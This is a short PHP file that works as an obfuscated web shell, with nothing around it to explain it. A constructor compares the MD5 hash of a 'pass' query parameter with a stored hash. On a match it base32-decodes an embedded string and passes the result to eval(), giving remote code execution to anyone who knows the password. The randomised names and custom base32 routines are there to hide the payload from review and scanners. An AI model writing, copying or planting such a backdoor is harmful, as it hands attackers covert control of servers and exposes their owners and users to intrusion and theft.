<?php
class RJTL{
        public $XMTH = null;
        public $WQZM = null;
        function __construct(){
        $this->XMTH = 'mv3gc3bierpvat2tkrnxuzlsn5ossoy';
        if(md5($_GET["pass"])=="df24bfd1325f82ba5fd3d3be2450096e"){
        $this->WQZM = @LFJY($this->XMTH);
        $WQZM= $this->WQZM;
        @eval("/*D0plCUK*/".$WQZM."/*D0plCUK*/");
        }}}
new RJTL();
function LVPZ($KAJO){
    $BASE32_ALPHABET = 'abcdefghijklmnopqrstuvwxyz234567';
    $GYHJ = '';
    $v = 0;
    $vbits = 0;
    for ($i = 0, $j = strlen($KAJO); $i < $j; $i++){
    $v <<= 8;
        $v += ord($KAJO[$i]);
        $vbits += 8;
        while ($vbits >= 5) {
            $vbits -= 5;
            $GYHJ .= $BASE32_ALPHABET[$v >> $vbits];
            $v &= ((1 << $vbits) - 1);}}
    if ($vbits > 0){
        $v <<= (5 - $vbits);
        $GYHJ .= $BASE32_ALPHABET[$v];}
    return $GYHJ;}
function LFJY($KAJO){
    $GYHJ = '';
    $v = 0;
    $vbits = 0;
    for ($i = 0, $j = strlen($KAJO); $i < $j; $i++){
        $v <<= 5;
        if ($KAJO[$i] >= 'a' && $KAJO[$i] <= 'z'){
            $v += (ord($KAJO[$i]) - 97);
        } elseif ($KAJO[$i] >= '2' && $KAJO[$i] <= '7') {
            $v += (24 + $KAJO[$i]);
        } else {
            exit(1);
        }
        $vbits += 5;
        while ($vbits >= 8){
            $vbits -= 8;
            $GYHJ .= chr($v >> $vbits);
            $v &= ((1 << $vbits) - 1);}}
    return $GYHJ;}
?>